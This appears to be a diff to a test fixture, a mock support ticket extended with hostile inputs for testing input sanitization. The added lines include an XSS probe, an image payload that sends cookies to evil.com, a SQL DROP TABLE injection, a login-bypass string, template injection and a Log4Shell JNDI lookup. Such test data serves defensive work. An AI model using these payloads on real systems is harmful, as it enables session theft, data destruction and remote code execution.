@@ -15,4 +15,16 @@ One more thing — I tried calling 0700000 by mistake (wrong number, ignore that
 
 Attempted login again just now, still broken. Ticket opened at 14:32 on Sept 3rd.
 
-Not sure if related, but here's some garbage that should NOT match anything: <script>alert('test')</script> 12345 asdkj@@@ .com http:/broken-url random-text-no-pattern-here
+--- Suspicious/hostile fragments below, for testing input sanitization ---
+
+Comment submitted via contact form: <script>alert('XSS test')</script> please fix my account
+
+Search query logged: '; DROP TABLE users; --
+
+Feedback field: <img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">
+
+Username attempted: admin' OR '1'='1
+
+Raw form paste: {{7*7}} ${jndi:ldap://malicious.com/a}
+
+Not sure if related, but here's some garbage that should NOT match anything: 12345 asdkj@@@ .com http:/broken-url random-text-no-pattern-here
